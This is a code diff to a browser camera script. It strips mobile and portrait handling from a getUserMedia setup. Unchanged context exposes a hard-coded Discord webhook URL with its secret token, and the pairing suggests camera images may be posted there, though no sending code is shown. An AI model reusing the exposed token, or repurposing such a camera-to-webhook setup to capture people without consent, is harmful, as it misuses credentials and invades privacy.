@@ -9,17 +9,13 @@ const canvasContainer = document.querySelector('.canvas-container');
 
 const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1269139070047621195/y1-bY0MITS4aXgJFwNYUN3-HX1cQmtqsieusfinmaRTOM0alYZcsC2rN7Xi_bjauyNWl'; // Replace with your Discord webhook URL
 
-function isMobileDevice() {
-    return /Mobi|Android/i.test(navigator.userAgent);
-}
-
 async function startCamera() {
     try {
         const devices = await navigator.mediaDevices.enumerateDevices();
         const videoDevices = devices.filter(device => device.kind === 'videoinput');
         
         if (videoDevices.length > 0) {
-            let constraints = {
+            const constraints = {
                 video: {
                     width: { ideal: 1280 },
                     height: { ideal: 720 },
@@ -27,31 +23,9 @@ async function startCamera() {
                 }
             };
 
-            if (isMobileDevice()) {
-                constraints = {
-                    video: {
-                        width: { ideal: 720 },
-                        height: { ideal: 1280 },
-                        aspectRatio: { ideal: 9 / 16 }
-                    }
-                };
-                video.style.height = 'auto';
-                video.style.width = '100%';
-            }
-
             const stream = await navigator.mediaDevices.getUserMedia(constraints);
             video.srcObject = stream;
             video.setAttribute('crossorigin', 'anonymous');
-            
-            video.addEventListener('loadedmetadata', () => {
-                if (video.videoHeight > video.videoWidth) {
-                    canvas.width = video.videoHeight;
-                    canvas.height = video.videoWidth;
-                } else {
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                }
-            });
         } else {
             console.error("No video devices found.");
         }
@@ -63,16 +37,6 @@ async function startCamera() {
             });
             video.srcObject = fallbackStream;
             video.setAttribute('crossorigin', 'anonymous');
-
-            video.addEventListener('loadedmetadata', () => {
-                if (video.videoHeight > video.videoWidth) {
-                    canvas.width = video.videoHeight;
-                    canvas.height = video.videoWidth;
-                } else {
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                }
-            });
         } catch (fallbackError) {
             console.error("Error accessing the camera with default constraints:", fallbackError);
         }
